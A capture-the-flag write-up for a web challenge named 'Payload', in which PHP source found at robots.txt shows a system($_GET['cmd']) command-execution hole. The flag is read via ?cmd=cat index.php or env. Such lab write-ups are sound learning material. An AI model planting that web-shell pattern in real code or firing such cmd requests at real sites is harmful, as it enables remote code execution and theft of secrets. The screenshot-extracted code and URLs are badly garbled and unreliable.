# Payload
> No description.

## About the Challenge
We were given a website that has a button to give us a detail about the system


[Image extracted text: 2 
C
ch42906117574
rung =
?btn=
Hurrey! I just created my first website
System details
System Details: Linux traboda 5.4.209-116.363.amzn2.X86_64 #1 SMP Wed
10 21.19.18 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
cheng:
Aug]


## How to Solve?
When I want to check the source code, trying every single thing on the `btn` parameter. The result is nothing. And then I decided to test some interesting endpoint like `.git` or `robots.txt`. And then there is a source code when I open `robots.txt`


[Image extracted text: ch42906117574.ch.eng run/robotstx
https://ch42906117574.ch eng run/robots txt
Getting Started
#519502 Name Link B_
#927384 Race Conditi__
#502758 RCE and Co_
<'php
iflisset($_GET[
cmd' ]) ){
system($_GET[
cmd ' ])_
else
iflisset($_GET[
btn' 1)){
echo
<bxSystem Details:
<1b>'
system(
uname
~a");]


As you can see, we can execute an OS command using the `cmd` parameter. And then read `index.php` file to obtain the flag or we can execute the `env` command to retrieve the flag from environtment variables


[Image extracted text: My Website
https//ch42906117574.ch,eng run/? X
C
view-source:https://ch42906117574.ch.eng run/?cmd=cat index-php
Getting Started
#519502 Name Link B.
#927384 Race Conditi_.
#502758 RCE and Co_
Exploit Database
<body>
10
<hl> Hurrey!
I just created my first website</hl>
11
<form action=
method="GET" >
12
button type="submit"
name="btn" System details<
button>
13
<brxebr>
14
form>
15
</body:
16
</html>
17
18 < !DOCTYPE_htmlz
19 <html_langz
en
20 <head>
21
<meta charset="UTF-8" >
22
<meta http-equiv-"X-UA-Compatible"
content="IE-edge
23
<meta
name="viewport
content-"width-device-Width, initial-scale-1.0">
24
<title My Website</title>
25 </head?
26
<body?
27
<hl> Hurrey!
I just created my first website</hl>
28
<form action=
method="GET" >
29
button type-"submit"
name-"btn" System details</button>
30
br <br>
31
form>
32
</body>
33
<Ihtml>
34
35
Pphp
putenv("FLAG-VishwaCTF{yeu_ f_0-U-n-d_M3}" J;
36
if(isset($_GETI
cmd ' 1)) {
system($_GET['cmd' ]);
else

if(iecho(_GEJystem Details:_K/bz"_
system(
'uname
-a");
46
2>]


```
VishwaCTF{y0u_f-o-u-n-d_M3}
```